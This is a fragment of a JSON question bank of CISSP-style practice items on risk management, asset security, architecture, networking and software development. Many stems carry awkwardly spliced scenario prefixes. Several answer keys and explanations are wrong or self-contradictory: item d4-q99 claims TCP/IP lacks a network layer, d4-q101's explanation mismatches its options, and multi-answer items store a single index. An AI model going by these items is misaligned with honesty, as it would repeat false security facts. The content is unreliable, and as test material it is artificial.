      "explanation": "Option 1 is correct for this case. Members of a skeleton crew are staff members who handle the most sensitive roles post-disaster. They carry out their first assignment during the recovery phase. There is no link between a skeleton crew and the concept of executive succession planning, which refers to the process by which a replacement is secured when a senior executive retires, quits, or passes away. Option 2 is not correct because documentation of deputy responsibilities is part of executive succession planning. 3 is incorrect because, in some company policies, two or more senior employees are subjected to a certain risk concurrently as part of executive succession planning. This is meant to ensure that if a disaster occurs, the senior employees and the company remain protected. Option 4 is not correct because, as part of executive succession planning, organizations establish predetermined steps to ensure the company is protected upon the retirement, death, or resignation of a senior executive staff member."
    },
    {
      "id": "d7-q110",
      "domain": "7. Security Operations",
      "stem": "A security review team is evaluating whether at a federal contractor, afsana works as a security officer in a local bank. She has been asked to teach a group of new employees how to comply with the bank's security policy as they perform their day-to-day tasks. This event is called ____________?",
      "choices": [
        "Education",
        "Awareness",
        "Training",
        "Termination"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. Training refers to teaching personnel how to carry out their job responsibilities (in this case, as they adhere to the security policy of a company). Organizations often host training that targets employees who share common job responsibilities. Also, it is critical to train new staff to ensure they comply with an organization's procedures, guidelines, and the standards stipulated by the security policy. Option 1 is not correct because education refers to a process that seeks to teach users (as opposed to employees) in greater scope and detail what they need to know for a given subject, and may include theory and instruction beyond job tasks and requirements. Option 2 is not correct because awareness is a process that establishes the minimum standard/common denominator or understanding of security. Option 4 is not correct because termination refers to a process whereby an employee's service to an organization comes to an end."
    },
    {
      "id": "d8-q77",
      "domain": "8. Software Development Security",
      "stem": "Meera is a software developer in a organization that sells toys online. She has been tasked with the responsibility of developing software that will ease how customers make their payments. If Meera decides to apply the waterfall model of software development, which of the following answers shows the steps she will follow from first to last?",
      "choices": [
        "Design, Requirements, Testing, Coding, Maintenance",
        "Design, Requirements, Coding, Testing, Maintenance",
        "Requirements, Design, Coding, Testing, Maintenance",
        "Requirements, Design, Testing, Coding, Maintenance"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. The five steps followed in the waterfall model software development process are Requirements, Design, Coding, Testing, and Maintenance. Option 1 is not correct because apart from maintenance, the other steps are not correct. Option 2 is not correct because the Requirements and Design steps have been interchanged. Option 4 is not correct because the Coding and Testing steps have been interchanged."
    },
    {
      "id": "d8-q78",
      "domain": "8. Software Development Security",
      "stem": "As part of organization risk governance, at a multinational bank, pallavi has discovered that programmers within her enterprise, when enforcing certain changes to software components, are not documenting their work or adhering to version control before uploading it to the primary software repository. This situation has caused confusion and forced some departments to revert to the initial versions. The best solution to this situation is ____________________?",
      "choices": [
        "Software configuration management",
        "Software change control management",
        "Software configuration management escrow",
        "Software escrow"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. A software configuration management system enables change control processes to be accomplished using automation when changes are made to a software product while still in the development life cycle. Option 2 is not correct because software change control management only forms a portion of software configuration management and is not an official term used to refer to this kind of functionality. 3 is not correct since software configuration management escrow is not an official term. Option 4 is not correct because, with software escrow, a copy of the source code is stored by a third party and released to the customer only under certain circumstances (for instance, if the code developer is no longer in business)."
    },
    {
      "id": "d1-q137",
      "domain": "1. Security and Risk Management",
      "stem": "In preparation for an external audit, at a logistics enterprise, your organization has hired a new Security Architect who has experience with products from a particular vendor and is therefore inclined to use their suite of products. She suggests your team replaces the existing tools with the products of her chosen vendor. What is the primary concept missing from this action?",
      "choices": [
        "Risk Assessment",
        "Due Diligence",
        "Due Care",
        "Strategic Alignment"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. The primary goal of a security professional is to achieve the fundamental objectives of Confidentiality, Integrity, and Availability while supporting the organization's objective – Strategic Alignment. The inclusion or replacement of products should not be driven by emotions or preference but rather be based on Risk Assessment and Due Diligence. Other objectives include Value Delivery, Customer Satisfaction, and Reduced Liability. The above preference-based decision seems to be distant from all the aforementioned objectives. All the decisions must be strategically aligned with the Organization's Goals. Risk Assessment (1) is the crucial step involved while making any security decision, however, it is still a component of Strategic Alignment (4). Same is the case with due dilligence (2) and due care (3)."
    },
    {
      "id": "d1-q138",
      "domain": "1. Security and Risk Management",
      "stem": "While planning a control enhancement roadmap, at a multinational bank, the Stuxnet (2010) Advance Persistent Threat (APT) impacted specialized hardware equipment and included many zero-day attacks. What is the best way to safeguard enterprises against such attacks?",
      "choices": [
        "Define Security Policies that ensure defense in depth",
        "Deploy IDS/IPS, Firewalls with strict ingress/egress rules",
        "Classify the Organization's infrastructure and apply appropriate safeguards based on the criticality",
        "Perform Risk Management and define safeguards accordingly"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. Zero-day vulnerabilities are unknown to the vendor and hence there is no fix to the vulnerability of system/software/control. The best way to deal with zero-day vulnerabilities is to have clearly defined Security Policies that ensure defense in depth. Security Policies define the asset classifications (3), based on which the criticality of assets is evaluated and a cost-benefit analysis is done (4). Based on the Risk Analysis, specific controls are defined (2)."
    },
    {
      "id": "d1-q139",
      "domain": "1. Security and Risk Management",
      "stem": "As part of organization risk governance, at a logistics enterprise, your enterprise, a health service provider, has acquired a new health-based Cloud Product that registers users and collects their Personally Identifiable Information (PII). What is the first step you as a Cybersecurity Expert will do to analyze the Privacy Requirements of the new product?",
      "choices": [
        "Evaluate and document the data collected",
        "Identify if the Cloud Provider adheres to Health Information Portability and Accountability Act (HIPAA)",
        "Validate if the new product adheres to your organization's Privacy Requirements",
        "Evaluate the Statement of Applicability (SOA) of ISO 27001"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. The first step to evaluating the privacy requirements of any product will be to identify, evaluate, and document the data collected by that product. Once you know what data has been collected from the user, you can identify what data is relevant and ensure you are only collecting that which is necessary. Option 2 is not correct as it is the next step to identify the location/jurisdiction of the users, which helps us to identify which Data Protection law applies to us in case of a data breach. Option 3 is also incorrect. Of course, we need to validate whether the Cloud Application adheres to the Organization's Privacy Requirements and/or Health Information Portability and Accountability Act (HIPAA), but the first step should be to analyze the data collected by the application. Evaluation of Service Organization Controls (SOC2) reports is a crucial step before acquisition during the due diligence, but in this scenario, the product is already acquired, hence this option 4 is incorrect"
    },
    {
      "id": "d1-q140",
      "domain": "1. Security and Risk Management",
      "stem": "You identify a security error in which the firewall is restarted several times during the course of a given period of time. While the firewall is down (between restarts), it allows traffic into the organization which is otherwise denied by default. What type of investigation are you most likely to perform as a Security Consultant?",
      "choices": [
        "Criminal",
        "Administrative",
        "Civil",
        "Regulatory"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. Administrative/Organizational investigation has the least burden of proof as the intention of the investigation is to identify the root cause behind the issue and to make sure the issue does not happen again. option 1 is not correct as a criminal Investigation has the highest burden of proof (\"Beyond a reasonable doubt\") as once the culprit is identified and proven, this could lead to imprisonment and/or fines. Option 3 is not correct as a civil Investigation has a lesser burden of proof than a criminal investigation, but still greater than administrative (it requires a \"Preponderance of Evidence\"). Examples of Civil cases are Intellectual Property Violations or events/practices that may violate an individual's or organization's legal rights. Civil cases generally lead to compensating the victim (monetary fines or the abolishment of practices that led to the case). Option 4 is not correct as regulatory investigations often take the form of external, mandatory audits, and are focused on evaluating security controls and compliance. A Regulatory investigation may take the form of an organizational investigation, civil investigation, or criminal investigation depending upon the type of incident. Regulatory investigations are conducted by a regulating body, against an organization suspected of a violation."
    },
    {
      "id": "d1-q141",
      "domain": "1. Security and Risk Management",
      "stem": "In preparation for an external audit, at a telecom operator, what is the best way to safeguard your organization against the use of external storage devices by employees/business partners who have access to the organizational resources?",
      "choices": [
        "Install Intrusion Detection/Prevention Software",
        "Disable the USB Ports on all the machines",
        "Install third party tools which detect and block the use of external storage devices",
        "Define Security Policy, standards, procedures, and guidelines against the use of external devices"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. The best way to safeguard against any threat is to define the action plan and the set of rules, policies, standards, procedures, and guidelines to make sure that you have addressed the issue. Once these are defined depending upon the Risk Assessment, the appropriate controls are identified and placed to reduce the risk. CISSP requires you to think like a manager, not solve the issue. Other options require you to fix the problem."
    },
    {
      "id": "d1-q142",
      "domain": "1. Security and Risk Management",
      "stem": "As part of organization risk governance, at a telecom operator, recent Security Reports show that many developers are using free cloud-based tools like data formatters, data parsers, convertors, and comparators. They copy the enterprise's code into these tools instead of using the enterprise's provided tool to process the data. Which option agreements is most likely to be violated?",
      "choices": [
        "Acceptable Use Policy",
        "Non-Disclosure Agreement",
        "Non-Compete Agreement",
        "Employment Contract"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. Acceptable Use Policy (AUP) provides your employees with an understanding of how they are expected to use the organization's resources. This involves Internet Usage Policy, Work from Home Policy, and Endpoint Security Policy. The policy helps to protect both the organization and the employee. The employee will be aware that browsing certain sites and downloading certain files is prohibited and that the policy must be adhered to or there could be serious repercussions, thus leading to fewer security risks for the business as a result of employee negligence. The policy outlines the Do's and Don'ts along with the penalties in case of violation. The AUP helps to ensure that the employees understand the organization's policy and prohibits intentional or unintentional sensitive data leakage through internet tools. A Non-Disclosure Agreement (2) prohibits sharing of organizational data with third parties. It is a legal contract between at least two parties that outlines confidential material, knowledge, or information that the parties wish to share with one another for certain purposes but wish to restrict access to. Examples of violations of NDAs include telling friends or family members about the protected material, releasing company information to the press or to the consumer public, releasing photos, videos, or audio recordings of the sensitive material, or informing competing businesses about the company's plans. NDAs apply to the employee even after the employee leaves the organization. In Non-Compete Agreements (3), the Employee specifically agrees that for a period of X [months/years] after the Employee is no longer employed by the Company, the Employee will not engage, directly or indirectly, either as proprietor, stockholder, partner, officer, employee or otherwise, in the same or similar activities as were performed for the Company in any business. Examples of breaches of Employee Contracts (4) include breach of the Organization's AUP, NDA, NCA (if applicable), breaking any restraints of trade clauses in the employment contract, such as going to work for a competitor when your contract doesn't allow it, taking your client contact list with you when you leave, and quitting without giving proper notice as per your contract."
    },
    {
      "id": "d1-q143",
      "domain": "1. Security and Risk Management",
      "stem": "In preparation for an external audit, at a healthcare provider, you are asked to initiate a Threat Modeling exercise within your enterprise. Since this is the first time the organization is doing this, what will be the next step after identifying the objective for the Threat Modeling exercise?",
      "choices": [
        "Identify Threats",
        "Identify Vulnerabilities",
        "Identify Risks",
        "Identify Assets"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Threat modeling enables you to perform a proactive cybersecurity threat assessment. Security teams use threat modeling insights to evaluate risks and prioritize mitigation. Threat modeling can help security teams prioritize threats, ensuring that resources and controls are applied effectively. After the organization has determined the objective of the Threat Modelling exercise, the next step will be to identify the assets that are valuable to the organization. Typical next steps of threat modeling are identifying threats, architecture analysis to determine potential attacks, reduction analysis, prioritization, and response."
    },
    {
      "id": "d2-q81",
      "domain": "2. Asset Security",
      "stem": "Your organization has initiated a knowledge campaign to provide free courses to all. Which option data classification categories relates most closely to the course content?",
      "choices": [
        "Confidential",
        "Private",
        "Sensitive",
        "Public"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. The above scenario corresponds to the Private/Business Sector. The course content, however, corresponds to information that is publicly available to everyone. Organizations generally maintain the integrity of public information. Though free, this is still the Intellectual Property of the Organization. Confidential (1) is a classification used for data that is extremely sensitive and for internal use only. A significant negative impact could occur for a company if confidential data is disclosed. Confidential data is sometimes labeled as proprietary. If proprietary data is disclosed, it can have drastic effects on the competitive edge of an organization. Private (2) is a classification used for data that is of a private or personal nature and intended for internal use only. If disclosed a significant negative impact could occur for the company/individuals. Sensitive (3) is the classification given to data that should not be available to everyone (like public data) but which isn't private or confidential. A negative impact could occur on the company if sensitive data is disclosed. An example of Sensitive Data is Internal Network Design, Software used, etc."
    },
    {
      "id": "d2-q82",
      "domain": "2. Asset Security",
      "stem": "During a post-incident lessons-learned meeting, at a healthcare provider, your organization follows strict data classification policies and marks all sensitive and critical systems with appropriate data classification. However, you find that the organization does not mark or label the non-confidential components. What is the issue with this approach?",
      "choices": [
        "Unlabelled data intrinsically means unclassified information",
        "No Retention Policy is applied to the unlabelled data",
        "Unlabelled data could lead to mishandling",
        "All of the above"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. When you do not label the data and/or systems with appropriate classifications, you won't be sure of the kind of data you are dealing with. This can lead to mishandling of the data. All the Data Handling Policies, Data Archiving, and Data Retention Policies are defined based on the data classification. It is therefore crucial to label all the data/systems with the appropriate level of classification."
    },
    {
      "id": "d2-q83",
      "domain": "2. Asset Security",
      "stem": "During a post-incident lessons-learned meeting, at a cloud SaaS company, recently, one of your highly critical systems failed. Thankfully due to High Availability, the organization was not significantly impacted. The Root Cause Analysis pointed out that the server's hard disk had failed. You have outsourced the hardware management to a third-party vendor, and they have already provided you with a replacement and taken away the damaged one. What is the potential issue with this?",
      "choices": [
        "Since the server is critical, third-party vendors should not have been involved",
        "Mishandling of Organizational Data remnants in the HDD by the vendor",
        "Health checks of other systems in the HA infrastructure will not be checked",
        "No issue with the process."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. A damaged HDD can be used to recover critical organizational data. Before handing over the damaged system to the vendor, the existing hardware should be sanitized based on the organization's Security Policies. Without this step, there is potential for mishandling of the organization's critical data by the vendor."
    },
    {
      "id": "d2-q84",
      "domain": "2. Asset Security",
      "stem": "As part of organization risk governance, at a cloud SaaS company, in compliance with your Enterprise's Data Retention Policies, you have archived the logs generated in your SIEM systems. Which option options can you perform on the archived data? (Select TWO)?",
      "choices": [
        "Create",
        "Read",
        "Update",
        "Delete"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 2 and 4. Options 1 and 3 are incorrect as you cannot update/create the contents after the data is archived. Once the data is archived, appropriate controls should be placed in order to make sure that the contents cannot be updated. However, the read and deletion of data (B and D, respectively) are permitted based on the Organization's Retention Policy and are therefore the correct answer options for this question. The NIST Special Publication 800-92, \"Guide to Computer Security Log Management\" establishes guidelines and recommendations for securing and managing sensitive log data. NIST SP 800-92 defines a log management infrastructure as having 4 major functions: 1. General - log parsing, event filtering, and event aggregation. 2. Log Storage - rotation, archival, compression, reduction, normalization, integrity checking. 3. Log Analysis - event correlation, viewing, and reporting. 4. Disposal – clearing."
    },
    {
      "id": "d2-q85",
      "domain": "2. Asset Security",
      "stem": "In preparation for an external audit, at a federal contractor, during a recent vulnerability assessment, it is uncovered that a few of the legacy systems are still using a software whose end-of-support is due next month. What is the biggest cause of concern about this report?",
      "choices": [
        "The software will stop running",
        "The system's vulnerability could not be addressed by the vendor",
        "The system's new versions will not be launched",
        "The vendor will no longer sell this software version"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. End of support (can also be known as the end of service) is when the vendor will no longer provide RMAs, technical support, repairs, or upgrades. End of life means the vendor considers the product no longer useful to be produced or effective for an environment. Perhaps it has been left behind by Moore's Law or better and more secure technology has come out. Either way, the vendor will no longer be taking the effort to sell or market it. This is outlined by the NIST SPECIAL PUBLICATION 1800-5A IT Asset Management, which provides solutions that span traditional physical asset tracking, IT asset information, physical security, and vulnerability and compliance information. Users can now query one system and gain insight into their entire IT asset portfolio. NIST SP 1800-5A has the following properties: 1. Maps security characteristics to guidance and best practices from NIST and other standards organizations, including the PCI DSS 2. Provides detailed example solution with capabilities that address security controls, as well as instructions for implementers and security engineers, including examples of all the necessary components for installation, configuration, and integration 3. Is modular and uses products that are readily available and interoperable with your existing IT infrastructure and investments"
    },
    {
      "id": "d2-q86",
      "domain": "2. Asset Security",
      "stem": "Your organization provides critical services to many other enterprises including Federal Agencies, Hospitals, Banks, etc, and manages the Personally Identifiable Information (PII) of the clients/users of those enterprises. Which option compliance requirements apply to your enterprise?",
      "choices": [
        "Federal Regulatory Compliance as it is the most strict",
        "Regulatory Compliance applied to Financial Institutions",
        "HIPAA as it includes both Security and Privacy Compliances",
        "All of the above and any other applicable regulatory Compliances, including local laws"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. The organization that handles data of different industries must be in compliance with all the applicable Standards and Regulations applied to that organization. These are also defined in the client agreements and the vendor/service provider must follow the standards defined by the Regulations. Along with the Industrial Regulations, the organization has to abide by the local laws and regulations applied to them."
    },
    {
      "id": "d2-q87",
      "domain": "2. Asset Security",
      "stem": "While planning a control enhancement roadmap, at a healthcare provider, following Asset Identification and Data Classification, what is the next step in identifying what you need to protect?",
      "choices": [
        "Configure Controls based on Secure Practices",
        "Implement the Controls",
        "Use a Security Baseline to identify Controls",
        "Tailoring and Scoping"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. Once an organization has identified and classified its assets, it will typically want to secure them by using the Security Baseline. Baselines provide a starting point and ensure a minimum-security standard. Generally, the Control Baseline (1) is selected based on Industry Best Practices, e.g., ISO 27002. After selecting a control baseline, organizations fine-tune it with tailoring and scoping processes (4). Scoping refers to removing the baselines that are not required based on Organization requirements. Tailoring refers to customizing the controls in the baselines. This is followed by adding compensating/missing controls (2) as suggested by the Baseline or replacing the baseline control with another control if required."
    },
    {
      "id": "d3-q103",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Based on your recent security management meeting, it is decided that your organization will move its focus to the Zero Trust Principles. Which option principles applies to the concept of Zero Trust? (Select 3)?",
      "choices": [
        "Never trust, always verify",
        "Operate under the assumption of a data breach",
        "Security Parameter",
        "Least Privilege"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1, 2, and 4. Much like other kinds of digital transformations, implementing zero trust isn't a plug-and-play solution to fix the shortcomings of current cybersecurity practices. It is a total commitment to a process that alters an organization's structure. In any transformation project, there is an opportunity to reduce cybersecurity risk by applying the guiding principles of zero trust: A, Never trust, always verify: Treat every user, device, application, and data flow as untrusted. D, Authenticate and explicitly authorize each to the least privilege required using dynamic security policies. B, Operate under the assumption of a data breach: Consciously operate and defend resources with the assumption that an adversary already has a presence within an organization. Deny by default. Heavily scrutinize all users, devices, data flows, and requests for access. Log, inspect, and continuously monitor all configuration changes, resource accesses, and network traffic for suspicious activity. Verify explicitly: Access to all resources should be conducted in a consistent and secure manner using multiple attributes (dynamic and static) to derive confidence levels for contextual access decisions to resources. With the advent of Cloud Infrastructure and people working from anywhere, the concept of Security Parameter is now vague and the concept of Zero Trust is being applied to provide security against data breach."
    },
    {
      "id": "d3-q104",
      "domain": "3. Security Architecture and Engineering",
      "stem": "As part of organization risk governance, at a logistics enterprise, you work in a small organization where you find that the Senior Management has access to everything including super admin privileges to Applications, Domains, and App/Web Servers. Which option Security Principles is most likely to be violated with this approach?",
      "choices": [
        "Secure Defaults",
        "Need to Know",
        "Least Privilege",
        "Zero Trust"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. The principle of least privilege states that one should only have access to what they need and nothing more. In the above scenario, everyone in the Senior Management Team has access to privileges that they don't need or use in their day-to-day actions. Need to Know refers to the confidentiality of information. You don't reveal the information to anyone who does not need to know about it. For example, People from the HR department do not need to know about the Financial Reporting Application managed by the Finance Department Secure Defaults is the Security Concept which ensures that the default configuration settings of a product are the most secure settings possible. Zero Trust is a security concept centered on the belief that organizations should not automatically trust anything inside or outside their perimeters and instead must verify anything and everything trying to connect to its systems before granting access."
    },
    {
      "id": "d3-q105",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A security review team is evaluating whether at a multinational bank, during the sales presentation of the Enterprise VPN Solution, the Sales Representative mentions that their product is certified by Evaluation Assurance Level (EAL7) Common Criteria Standards. How does this impact your decision about selecting the product?",
      "choices": [
        "The Common Criteria ensures that the product is appropriate for your organization",
        "The Common Criteria ensures that the product has met Functionality and Assurance requirements",
        "The Common Criteria ensures that the product meets all the functional and non-functional requirements",
        "The Common Criteria ensures that the product is secure irrespective of how users act on it."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. The Common Criteria ensures that the product has met the Functionality and Assurance Standards of a specific Protection Profile. However, your organization must evaluate whether the Protection Profile matches your organization's requirements. The Common Criteria ensures that the following are true: • Products can be evaluated by competent and independent licensed laboratories so as to determine the fulfillment of particular security properties to a certain extent or assurance • Supporting documents are used within the Common Criteria certification process to define how the criteria and evaluation methods are applied when certifying specific technologies • The certification of the security properties of an evaluated product can be issued by a number of Certificate Authorizing Schemes, with this certification being based on the result of their evaluation"
    },
    {
      "id": "d3-q106",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A security review team is evaluating whether at a federal contractor, windows BitLocker uses which concept to perform Full Disk Encryption using hardware on the motherboard that is used to store Encryption keys?",
      "choices": [
        "Read Only Memory (ROM)",
        "Unified Extensible Firmware Interface (UEFI)",
        "Basic Input/Output System (BIOS)",
        "Trusted Platform Module (TPM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Trusted Platform Module (TPM) technology is designed to provide hardware-based, security-related functions. A TPM chip is a secure crypto-processor that helps you with actions such as generating, storing, and limiting the use of cryptographic keys. Windows BitLocker uses the TPM technology to perform Full Disk Encryption."
    },
    {
      "id": "d3-q107",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In preparation for an external audit, at a telecom operator, you developed a web scraping script that scrapes data from a website and sends you alerts whenever anything new is added to that site. You want to deploy this script on a cloud-based environment so your script runs non-stop. Which option cloud-based models supports this requirement?",
      "choices": [
        "Infrastructure as a service (IaaS)",
        "Platform as a service (PaaS)",
        "Software as a service (SaaS)",
        "Cloud as a service (CaaS)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. Function as a service (FaaS), which is a sub-category of Platform as a service (PaaS), is a service-hosted remote procedure call that leverages serverless computing to enable the deployment of individual functions in the cloud that run in response to events. Some examples of FaaS are Heroku, AWS Elastic Beanstalk, Windows Azure, Force.com, Google App Engine, and OpenShift. Option 1 is not correct because Infrastructure as a service is a layer of computing platform that enables clients to outsource IT infrastructures including virtual machines, storage, processing, networking, servers, and other resources on the internet through the model of pay-as-per-use. Option 3 is not correct because Software-as-a-service refers to a model employed in software distribution where a third-party provider acts as the host of applications and avails them to clients over the internet. Option 4 is not correct because Cloud-as-a-service refers to the usage of cloud computing services that are paid for on the basis of pay-per-use."
    },
    {
      "id": "d3-q108",
      "domain": "3. Security Architecture and Engineering",
      "stem": "During a post-incident lessons-learned meeting, at a multinational bank, one-time pad is considered to be an unbreakable encryption mechanism with a brute force attack. What is the most likely reason it is not used commercially?",
      "choices": [
        "The key must be at least as long as the plaintext",
        "The key must be random",
        "The key must never be reused in whole or in part",
        "The key must be kept completely secret by the communicating parties."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. The one-time pad is the only encryption mechanism that is a completely unbreakable cipher. The main disadvantage of encryption with the one-time pad is that it requires a pad of the same length as the plaintext message to be encrypted. Since each pad can only be used once, it is necessary to share a pad of the same length as the message to be shared. This pad must be shared through a completely secure method in order to protect the secrecy of the message. Doing so in real-time is illogical since the existence of a secure method to share the pad means that the message could just be sent using this method."
    },
    {
      "id": "d3-q109",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In preparation for an external audit, at a federal contractor, in your development environment, you mostly use Self-Signed Certificates to test the TLS features of the in-built applications. What is the reason why the usage of Self-Signed Certificates is discouraged?",
      "choices": [
        "Self-Signed Certificates do not have public keys",
        "Self-Signed Certificates cannot be used in TLS",
        "Self-Signed Certificates do not have associated private keys",
        "Self-Signed Certificates are not trusted"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. A Self-Signed Certificate can be generated by anyone which makes them inherently not trusted by your browser because a certificate itself doesn't form any trust. This can only be the case where the certificate is signed by a trusted Certificate Authority."
    },
    {
      "id": "d4-q99",
      "domain": "4. Communication and Network Security",
      "stem": "As part of organization risk governance, at a logistics enterprise, the Open System Interconnect (OSI) model defines 7 network layers. However, in the current network infrastructure (TCP/IP Model), some of the layers are either not required or their functions are managed by other layer(s). Which option layers is NOT a part of the application layer in the TCP/IP Model as compared to the described OSI Layers?",
      "choices": [
        "Application",
        "Presentation",
        "Network",
        "Session"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. The Network Layer is not present in the current TCP/IP network model as its functions are provided by the Application Layer. Operations like Data compression, Encryption, and more are handled by the Application Layer."
    },
    {
      "id": "d4-q100",
      "domain": "4. Communication and Network Security",
      "stem": "While planning a control enhancement roadmap, at a federal contractor, your organization wants to adopt IPv6. Given that not all your enterprise's existing network equipment currently supports it, which of the following options is FALSE with respect to the adoption of IPv6 (Internet Protocol)?",
      "choices": [
        "IPv6 uses 128 bits addressing",
        "IPv6 and IPv4 can co-exist on the same network",
        "With IPv6, Domain Name Service (DNS) is no longer required",
        "With IPv6, Network Address Translation (NAT) is no longer required"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. DNS is still required for IPv6. The Domain Name System (DNS) is the phonebook of the Internet. Humans access information online through domain names, like \"nytimes.com\" or \"espn.com\". Web browsers interact through Internet Protocol (IP) addresses. DNS translates domain names to IP addresses so browsers can load Internet resources. IPv6 is the future of the Internet as IPv4 addresses are limited and are not intrinsically secure. IPv6 uses 128-bit addressing (1) instead of the 32-bit addresses in IPv4. IPv6 offers many new features that are not available in IPv4. Some of IPv6's new features are scoped addresses, autoconfiguration, and quality of service (QoS) priority values. IPv6 and IPv4 can coexist on the same network (2) using one or more of three primary options: dual-stack, tunneling, or NAT-PT.With IPv6's autoconfiguration feature, NAT and DHCP are not required (4)."
    },
    {
      "id": "d4-q101",
      "domain": "4. Communication and Network Security",
      "stem": "As part of organization risk governance, at a cloud SaaS company, during a recent network attack, you found out that the existing firewall configuration allowed access to the server (10.1.1.19). Which option firewall rules did not allow for web access to the server?",
      "choices": [
        "DENY IP 10.1.1.19 80 PERMIT IP ANY ANY",
        "PERMIT IP ANY ANY DENY IP 10.1.1.19 21",
        "DENY IP 10.1.1.19 443 PERMIT IP ANY ANY",
        "DENY IP 10.1.1.19 443 DENY IP 10.1.1.19 80 PERMIT IP ANY ANY"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. The Firewall Rules should have explicit DENY rules specified before general Permit rules are listed. Option 4 denies both HTTP and HTTPS access to the server. In all the other options there is a way to access the server via HTTP (3), HTTPS (1). Option 2 allows all the traffic which allows access to the server too."
    },
    {
      "id": "d4-q102",
      "domain": "4. Communication and Network Security",
      "stem": "During a post-incident lessons-learned meeting, at a logistics enterprise, yao's organization has recently approved the budget for the Network Access Control Device, please select the features that do not match with the NAC capabilities?",
      "choices": [
        "Detect and Quarantine Malware affected devices",
        "Enforce security policy throughout the network",
        "Prevent/reduce known attacks directly and zero-day indirectly",
        "Use identities to perform access control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. Network access control is the act of keeping unauthorized users and devices out of a private network. Organizations that give certain devices or users from outside of the organization occasional access to the network can use network access control to ensure that these devices meet corporate security compliance regulations. NAC uses identities to perform access control to Prevent/reduce known attacks directly and zero-day indirectly. It also enforces security policy throughout the network. This is crucial when the enterprise allows for BYOD, Network access for non-Employees, the use of IoT Devices, etc. Detection and Quarantine of Malware affected devices is not a feature of NAC, but instead, of Anti-Malware software."
    },
    {
      "id": "d4-q103",
      "domain": "4. Communication and Network Security",
      "stem": "During a post-incident lessons-learned meeting, at a cloud SaaS company, you are investigating the authentication mechanisms used in your enterprise, which of the following authentication mechanisms is the least secure?",
      "choices": [
        "Challenge Handshake Authentication Protocol (CHAP)",
        "Extensible Authentication Protocol- Transport Layer Security (EAP-TLS)",
        "Extensible Authentication Protocol- Tunneled Transport Layer Security (EAP-TLS)",
        "Password Authentication Protocol (PAP)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
